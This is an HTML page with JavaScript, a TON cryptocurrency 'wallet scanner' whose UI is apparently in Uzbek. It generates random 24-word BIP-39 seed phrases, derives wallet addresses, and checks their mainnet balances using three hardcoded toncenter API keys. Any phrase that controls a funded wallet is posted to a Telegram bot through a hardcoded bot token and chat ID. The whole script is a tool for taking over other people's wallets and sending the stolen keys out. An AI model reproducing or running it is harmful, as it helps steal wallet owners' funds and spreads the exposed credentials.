<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON MASTER SCANNER v5.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonweb-mnemonic@0.0.6/dist/tonweb-mnemonic.js"></script>
</head>
<body class="bg-[#050505] text-white font-mono min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-2xl w-full bg-[#111] p-6 rounded-3xl border border-blue-500/30 shadow-[0_0_100px_rgba(37,99,235,0.1)]">
        <div class="text-center mb-6">
            <h1 class="text-2xl font-black text-blue-500 italic uppercase">TON MASTER SCANNER v5.0</h1>
            <p id="botStatus" class="text-[10px] text-green-500 uppercase tracking-widest">Algorithm: MNEMONIC-TO-V4R2</p>
        </div>

        <div id="terminal" class="bg-black/80 rounded-2xl p-4 h-80 overflow-y-auto mb-6 text-[11px] border border-slate-800 space-y-1">
            <p class="text-blue-400">> System Ready. Click Start to Load Modules...</p>
        </div>

        <div class="space-y-3">
            <button id="startBtn" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-black text-lg transition-all active:scale-95 shadow-lg shadow-blue-900/30">
                START DEEP SCANNING
            </button>
            <button id="stopBtn" class="w-full bg-red-600/20 hover:bg-red-600 text-red-500 py-4 rounded-2xl font-bold hidden transition-all">
                STOP
            </button>
        </div>
        <p class="text-[9px] text-slate-600 mt-4 text-center italic">Checking real Mainnet balances with 3 API keys</p>
    </div>

    <script>
        // SIZNING KODINGIZ MANA SHU SCRIPT TEGLARI ICHIDA BO'LISHI KERAK
        const TELEGRAM_BOT_TOKEN = '8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw'; 
        const TELEGRAM_CHAT_ID = '7921132456'; 
        const API_KEYS = [
            'cdef18c228c4a4d63ead8a723cbf910e0385e52829df0e62300b3f859142271a',
            'b9e1cd205b86ebbd57238da87fdfef86a408d0abea6a81b768177ad2b9edfdff',
            '49b47d7dd41183ea53eb494c25c591022560484362a9355d033ef4149bad54c9'
        ];

        let currentKeyIndex = 0;
        let isRunning = false;
        let checkedCount = 0;
        let bip39Words = []; 
        const terminal = document.getElementById('terminal');
        const tonweb = new TonWeb();

        function addLog(msg, color = 'text-slate-500') {
            const p = document.createElement('p');
            p.className = color;
            p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            terminal.prepend(p);
            if (terminal.childNodes.length > 50) terminal.lastChild.remove();
        }

        async function loadDictionary() {
            try {
                const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
                const data = await response.text();
                bip39Words = data.split('\n').filter(word => word.length > 0);
                addLog(`BIP-39 Lug'ati tayyor!`, "text-green-500 font-bold");
                return true;
            } catch (e) {
                addLog("Lug'at yuklashda xato!", "text-red-500");
                return false;
            }
        }

        async function checkBalance(address) {
            const apiKey = API_KEYS[currentKeyIndex];
            currentKeyIndex = (currentKeyIndex + 1) % API_KEYS.length;
            try {
                const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${address}&api_key=${apiKey}`);
                const data = await response.json();
                if (data.ok && data.result) return parseInt(data.result.balance);
            } catch (e) { return -1; }
            return 0;
        }

        async function scan() {
            if (!isRunning) return;
            try {
                let mnemonic = [];
                for(let i=0; i<24; i++) {
                    mnemonic.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
                }
                if (window.TonWebMnemonic) {
                    const seed = await window.TonWebMnemonic.mnemonicToSeed(mnemonic);
                    const keyPair = TonWeb.utils.keyPairFromSeed(seed);
                    const wallet = new tonweb.wallet.all.v4R2(tonweb.provider, { publicKey: keyPair.publicKey, wc: 0 });
                    const address = await wallet.getAddress();
                    const addrStr = address.toString(true, true, true);
                    const balance = await checkBalance(addrStr);
                    checkedCount++;
                    if (balance > 0) {
                        addLog(`💎 TOPILDI! ${addrStr}`, "text-green-400 font-bold");
                        await sendToTelegram(mnemonic.join(" "), addrStr, balance);
                    } else {
                        addLog(`[${checkedCount}] API:${currentKeyIndex+1} Bo'sh: ${addrStr.substring(0,12)}...`);
                    }
                }
            } catch (err) { console.error(err); }
            setTimeout(scan, 450); 
        }

        async function sendToTelegram(phrase, address, balance) {
            const ton = balance / 1000000000;
            const msg = `💰 <b>REAL WALLET FOUND!</b>\n\n📄 <b>Phrase:</b> <code>${phrase}</code>\n🔗 <b>Addr:</b> <code>${address}</code>\n💎 <b>Balance:</b> ${ton} TON`;
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }

        document.getElementById('startBtn').addEventListener('click', async function() {
            addLog("Tizim yuklanmoqda...", "text-blue-400");
            if (bip39Words.length === 0) {
                const loaded = await loadDictionary();
                if (!loaded) return;
            }
            isRunning = true;
            this.classList.add('hidden');
            document.getElementById('stopBtn').classList.remove('hidden');
            addLog("SKANERLASH BOSHLANDI!", "text-blue-500 font-black");
            scan();
        });

        document.getElementById('stopBtn').addEventListener('click', function() {
            isRunning = false;
            this.classList.add('hidden');
            document.getElementById('startBtn').classList.remove('hidden');
            addLog("TO'XTATILDI.", "text-red-500");
        });
    </script>
</body>
</html>
